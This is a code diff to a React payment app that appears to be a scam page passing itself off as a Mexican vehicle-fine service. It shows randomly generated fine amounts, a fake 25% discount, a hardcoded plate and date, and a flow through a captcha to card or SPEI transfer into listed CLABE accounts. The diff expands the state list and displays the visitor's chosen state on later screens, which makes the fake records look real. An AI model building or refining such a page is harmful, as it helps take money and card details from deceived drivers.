@@ -52,6 +52,41 @@ const CLABES: { banco: string; clabe: string }[] = [
   { banco: "Santander", clabe: "014 180 11223344556 7" },
 ];
 
+const ESTADOS_MX = [
+  "Aguascalientes",
+  "Baja California",
+  "Baja California Sur",
+  "Campeche",
+  "Chiapas",
+  "Chihuahua",
+  "Ciudad de Mexico",
+  "Coahuila",
+  "Colima",
+  "Durango",
+  "Estado de Mexico",
+  "Guanajuato",
+  "Guerrero",
+  "Hidalgo",
+  "Jalisco",
+  "Michoacan",
+  "Morelos",
+  "Nayarit",
+  "Nuevo Leon",
+  "Oaxaca",
+  "Puebla",
+  "Queretaro",
+  "Quintana Roo",
+  "San Luis Potosi",
+  "Sinaloa",
+  "Sonora",
+  "Tabasco",
+  "Tamaulipas",
+  "Tlaxcala",
+  "Veracruz",
+  "Yucatan",
+  "Zacatecas",
+];
+
 const randomAmount = () => {
   // Monto original aleatorio entre $1000.00 y $5000.00
   const n = Math.random() * 4000 + 1000;
@@ -64,6 +99,7 @@ const fmt = (n: number) =>
 
 function Index() {
   const [screen, setScreen] = useState<Screen>("landing");
+  const [estado, setEstado] = useState<string>("");
   const original = useMemo(() => randomAmount(), []);
   const total = useMemo(() => Math.round(original * 0.75 * 100) / 100, [original]);
   const savings = useMemo(() => Math.round((original - total) * 100) / 100, [original, total]);
@@ -90,6 +126,7 @@ function Index() {
             total={total}
             savings={savings}
             clabe={clabe}
+            estado={estado}
           />
         )}
       </main>
@@ -98,7 +135,10 @@ function Index() {
       {screen === "consult" && (
         <ConsultModal
           onClose={() => setScreen("landing")}
-          onSubmit={() => setScreen("captcha")}
+          onSubmit={(e) => {
+            setEstado(e);
+            setScreen("captcha");
+          }}
         />
       )}
       {screen === "captcha" && (
@@ -486,7 +526,7 @@ function ConsultModal({
   onSubmit,
 }: {
   onClose: () => void;
-  onSubmit: () => void;
+  onSubmit: (estado: string) => void;
 }) {
   const [placa, setPlaca] = useState("");
   const [estado, setEstado] = useState("");
@@ -501,7 +541,7 @@ function ConsultModal({
       <form
         onSubmit={(e) => {
           e.preventDefault();
-          if (placa && estado) onSubmit();
+          if (placa && estado) onSubmit(estado);
         }}
         className="space-y-4"
       >
@@ -524,16 +564,7 @@ function ConsultModal({
             className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
           >
             <option value="">Seleccione un estado</option>
-            {[
-              "Estado de Mexico",
-              "Ciudad de Mexico",
-              "Jalisco",
-              "Nuevo Leon",
-              "Puebla",
-              "Guanajuato",
-              "Veracruz",
-              "Queretaro",
-            ].map((e) => (
+            {ESTADOS_MX.map((e) => (
               <option key={e} value={e}>
                 {e}
               </option>
@@ -616,6 +647,7 @@ function FlowPage({
   total,
   savings,
   clabe,
+  estado,
 }: {
   screen: Screen;
   setScreen: (s: Screen) => void;
@@ -623,6 +655,7 @@ function FlowPage({
   total: number;
   savings: number;
   clabe: { banco: string; clabe: string };
+  estado: string;
 }) {
   const stepNum =
     screen === "search" ? 1 : screen === "confirm" ? 2 : 3;
@@ -639,7 +672,9 @@ function FlowPage({
         </div>
         <Stepper step={stepNum} />
         <div className="mt-6">
-          {screen === "search" && <SearchCard onNext={() => setScreen("confirm")} />}
+          {screen === "search" && (
+            <SearchCard onNext={() => setScreen("confirm")} estado={estado} />
+          )}
           {screen === "confirm" && (
             <ConfirmCard
               onCard={() => setScreen("card")}
@@ -647,6 +682,7 @@ function FlowPage({
               original={original}
               total={total}
               savings={savings}
+              estado={estado}
             />
           )}
           {screen === "card" && (
@@ -701,7 +737,7 @@ function Stepper({ step }: { step: number }) {
   );
 }
 
-function SearchCard({ onNext }: { onNext: () => void }) {
+function SearchCard({ onNext, estado }: { onNext: () => void; estado: string }) {
   const [code] = useState(() =>
     Array.from({ length: 5 }, () =>
       "ABCDEFGHJKLMNPQRSTUVWXYZ23456789".charAt(Math.floor(Math.random() * 32))
@@ -721,7 +757,7 @@ function SearchCard({ onNext }: { onNext: () => void }) {
             ABC1234
           </div>
           <p className="text-xs text-[var(--burgundy)] mt-1">
-            Placa registrada en Estado de Mexico
+            Placa registrada en {estado || "Estado de Mexico"}
           </p>
         </div>
         <div>
@@ -756,12 +792,14 @@ function ConfirmCard({
   original,
   total,
   savings,
+  estado,
 }: {
   onCard: () => void;
   onSpei: () => void;
   original: number;
   total: number;
   savings: number;
+  estado: string;
 }) {
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-6">
@@ -780,6 +818,9 @@ function ConfirmCard({
         </div>
         <div className="mt-3">
           <DataField label="FECHA DE REGISTRO" value="11/05/2026, 09:54:19 a.m." />
+        </div>
+        <div className="mt-3">
+          <DataField label="ENTIDAD DE REGISTRO" value={estado || "Estado de Mexico"} />
         </div>
       </div>
 
